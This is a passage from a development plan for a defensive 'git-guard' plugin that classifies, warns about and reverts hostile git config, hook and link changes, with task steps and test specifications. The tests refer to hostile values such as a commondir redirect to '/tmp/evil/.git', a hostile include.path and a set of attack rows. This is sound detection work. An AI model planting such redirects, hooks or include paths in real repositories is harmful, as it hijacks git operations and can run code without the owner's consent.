  - `test_commondir_default_passes`, `test_commondir_redirect_fails` (`/tmp/evil/.git`)
  - `test_gitfile_inside_common_dir_passes`, `test_gitfile_elsewhere_fails`
  - `test_admin_gitdir_stale_is_note_only`
  - `test_attributes_absent_passes_present_fails`
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement `files.py`.**
- [ ] **Step 4: Run.** Expected: PASS.
- [ ] **Step 5: Commit** `feat(git-guard): classify hook and link files`.

### Task: judge

**Files:**
- Create: `plugins/git-guard/gitguard/judge.py`, `plugins/git-guard/tests/test_judge.py`, `plugins/git-guard/tests/test_corpus.py`

**Interfaces:**
- Consumes: everything above.
- Produces:
  - `classify(atom: Atom, ctx: ClassifyCtx, rules: RuleSet) -> tuple[Kind, Pass]`, which dispatches to `classify_entry` or `classify_file`. Notes are collected by `judge`.
  - `atom_key(atom) -> str`: `cfg|<member.git_dir>|<file>|<key.dotted()>|<value>` for config, `file|<path>` for files.
  - `atom_hash(atom) -> str`: `sha256(atom_key + "\0" + (sha256 or "") + "\0" + kind + "\0" + str(executable))` hex. For config it's just `sha256(atom_key)`.
  - `restore_ops(atom: Atom, cur: Surface, lkg: Lkg | None) -> tuple[RestoreOp, ...]`. This changes the sketch's signature: `cur` is needed to know whether a key is single-valued.
  - `finding_id(anchor: Anchor, atom: Atom) -> str`, per Global Constraints.
  - `judge(cur: Surface, lkg: Lkg | None, trust: TrustSet, rules: RuleSet, trig: Trigger) -> Verdict`.
  - `lkg_from(verdict: Verdict, cur: Surface) -> Lkg`, which holds only allowed atoms, with `dirty=False`. It's used by tests now and by `state.write_lkg` in v0.1.

Behavior:
- **`restore_ops`:**
  - `lkg is None` → `()`.
  - A `ConfigEntry` whose `(git_dir, file, key)` has exactly one value in LKG and exactly one in `cur` → `(SetKey(file, key, old=<lkg value>, new=<value>),)`.
  - Any other `ConfigEntry` → `(UnsetKey(file, key, value),)`.
  - A `FileAtom` whose LKG atom (same `atom_key`) has `content is not None` → `(WriteFile(path, content, 0o755 if lkg.executable else 0o644),)`.
  - A `FileAtom` hook or attributes atom with no LKG atom → `(MoveAside(path),)`.
  - Anything else (commondir/gitfile missing from LKG, alternates, content too large) → `()`.
- **Action ladder:**
  - base REVERT for REDIRECT, EXEC, HOOKFILE and LINK; base WARN for WEAKEN and UNKNOWN; alternates is always WARN.
  - Cap at WARN when `not trig.may_revert` or when `restore == ()`.
- **Trust:** if `(str(cur.anchor.path), atom_hash(atom))` is in `trust.grants`, the atom passes as `TRUSTED`.
- **First sight in session:** if `lkg is None and trig.first_sight_in_session`, compute restores against a synthetic `Lkg` of only the passing atoms of `cur`. Classification still uses `lkg=None`, so the hosts come from `cur`. Add the note `"first sight in session: synthetic LKG from passing atoms"`.
- **Notes:** one `"removed: <atom_key>"` per LKG key absent from `cur`, plus every `classify_file` note.
- **`Finding.why`:**
  - For config: `f"{key.dotted()}={value!r} in {file} is {kind.value}, not an allowed value"`.
  - For files: `f"{role} {path} is {kind.value} and matches no allowed state"`.

- [ ] **Step 1: Write failing tests** in `tests/test_corpus.py`:
  - `test_corpus_first_sight_no_findings`: for every `s` in `corpus_surfaces()`, `judge(s, None, TrustSet(frozenset()), default_rules(), trigger(TriggerKind.SWEEP, may_revert=False)).findings == ()`.
  - `test_attack_rows_all_found`:
    - Baseline is `surface` with `remote.origin.url=git@github.com:a/b.git`, `remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*`, `hook.hk-pre-commit.command=<hk cmd for pre-commit>` and `hook.hk-pre-commit.event=pre-commit`. LKG is `lkg_from(judge(baseline, None, …))`.
    - For each attack row, the current surface is the baseline with that key replaced when present, or added when absent.
    - The verdict under `trigger(POST_TOOL)` has a finding on that key, whose `kind.value` and `action.value` equal the row's expected columns.
- [ ] **Step 2: Write failing tests** in `tests/test_judge.py`:
  - `test_new_exec_key_reverted_with_unset`
  - `test_changed_url_reverted_with_setkey_old_value`
  - `test_multivar_restore_unsets_only_offending_value`: LKG has `include.path` absent and `remote.origin.fetch` ×2. Add a hostile `include.path` while two good ones are present. Expect `UnsetKey` with `value=<hostile>`, and no op on the good ones.
  - `test_no_lkg_is_warn_only`
  - `test_out_of_scope_caps_at_warn` (`may_revert=False`)
  - `test_first_sight_in_session_plant_is_revertible`
  - `test_trusted_grant_passes`
  - `test_new_hook_moved_aside`, `test_changed_hook_restored_from_lkg_bytes`
  - `test_commondir_redirect_restored`
  - `test_alternates_change_is_warn_only`
  - `test_removed_atom_is_note_not_finding`
  - `test_weaken_is_warn_even_with_lkg`
  - `test_finding_id_format` (matches `^f-[0-9a-f]{6}$`, and is stable across two calls)
  - `test_judge_is_trigger_blind`: for every fixture surface used in this file and every `TriggerKind` × `may_revert ∈ {True, False}` × `first_sight ∈ {False}`, the findings with `action` and `restore` stripped are identical. `first_sight=True` is excluded because it legitimately changes `restore`.
- [ ] **Step 3: Run.** Expected: FAIL.
- [ ] **Step 4: Implement `judge.py`.**
- [ ] **Step 5: Run** the full suite, and `python3 -c` the corpus test count. Expected: PASS. Every corpus row has zero findings, including the new `config.worktree` rows from X8, and all 38 attack rows match.
- [ ] **Step 6: Commit** `feat(git-guard): add judge, restore ops and corpus tests`.
- [ ] **Step 7: Wrap up.**
  - Run `./scripts/bump-version.sh --auto` and commit the result as `chore(git-guard): bump version to X.Y.Z`, if it changed anything. Before you do, check how `hk` was first added in #161 (`git log -p --follow` on its marketplace entry), so the new plugin doesn't double-bump from its starting version.
  - Annotate the tracking task in the local backlog with the branch name and the final test count. Mark it done.
  - Update the research design doc's `sketch.py` with the accepted deviations: `Surface.tracked_dirs` and `home`, the dropped `TrackedOracle`, `PurePosixPath`, `restore_ops(atom, cur, lkg)`, `resolve_redirect` replacing `normalise_redirect`, `classify` split into `classify_entry`/`classify_file`, `Row.when`/`var_regex`, the `f-` + 6-hex id, `judge` never emitting BLOCK, and `guard-state` deferred. Record "accepted in plan 2026-10-26" next to each.
